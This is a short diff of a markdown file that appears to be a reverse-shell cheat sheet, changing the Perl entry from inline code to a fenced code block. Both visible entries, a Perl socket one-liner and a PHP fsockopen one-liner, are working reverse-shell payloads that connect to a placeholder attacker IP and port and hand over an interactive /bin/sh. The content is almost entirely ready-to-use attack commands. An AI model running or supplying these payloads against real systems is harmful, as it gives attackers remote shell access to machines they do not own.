@@ -44,7 +44,10 @@ p.waitFor()
 ```
 
 + Perl 
-`perl -e 'use Socket;$i="[AttackerIP]";$p=[AttackerPort];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
+```
+perl -e 'use Socket;$i="[AttackerIP]";$p=[AttackerPort];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
 + PHP 
 `php -r '$sock=fsockopen("[attackerIP]",[attackerPort]);exec("/bin/sh -i <&3 >&3 2>&3");'`
